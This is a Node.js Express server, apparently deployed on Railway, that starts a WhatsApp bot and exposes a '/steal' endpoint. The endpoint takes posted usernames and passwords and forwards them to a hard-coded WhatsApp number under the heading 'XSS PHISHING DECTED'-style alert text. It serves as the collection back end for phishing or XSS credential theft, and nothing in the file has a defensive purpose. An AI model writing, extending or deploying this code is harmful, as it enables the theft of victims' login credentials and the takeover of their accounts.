const startBot = require('./config/WhatsappConnection');
const express = require('express');
const bodyParser = require('body-parser');

// ✅ Express server setup - MOVE THIS TO TOP
const app = express();
const port = process.env.PORT || 3001; // Railway sets PORT automatically

app.use(bodyParser.json());

// Health check routes (REQUIRED for Railway)
app.get('/', (req, res) => {
  res.json({ 
    status: 'online', 
    bot: 'Desire eXe Bot',
    platform: 'Railway',
    timestamp: new Date().toISOString()
  });
});

app.get('/health', (req, res) => {
  res.status(200).json({ 
    status: 'healthy',
    uptime: process.uptime(),
    timestamp: new Date().toISOString()
  });
});

// Example route: send data to your WhatsApp
app.post('/steal', async (req, res) => {
  const { username, password } = req.body;
  const yourNumber = '2347017747337@s.whatsapp.net'; // Fixed JID format

  try {
    // Wait for bot to be ready
    if (global.whatsappBot) {
      await global.whatsappBot.sendMessage(yourNumber, {
        text: `🕷 *XSS PHISHING DETECTED!* \n\n👤 Username: ${username}\n🔑 Password: ${password}`,
      });
      res.sendStatus(200);
    } else {
      res.status(503).json({ error: 'WhatsApp bot not ready' });
    }
  } catch (err) {
    console.error('❌ Error sending credentials to WhatsApp:', err.message);
    res.sendStatus(500);
  }
});

// Start the Express server FIRST
const server = app.listen(port, () => {
  console.log(`🚀 Express server running on port ${port}`);
});

// Then start WhatsApp bot
startBot().then((sock) => {
  // Store bot instance globally for use in routes
  global.whatsappBot = sock;
  console.log('✅ WhatsApp bot started successfully');
}).catch((err) => {
  console.error('❌ Failed to start bot:', err);
});

// Graceful shutdown for Railway
process.on('SIGTERM', () => {
  console.log('🚨 Railway is shutting down container...');
  server.close(() => {
    console.log('✅ Express server closed gracefully');
    process.exit(0);
  });
});


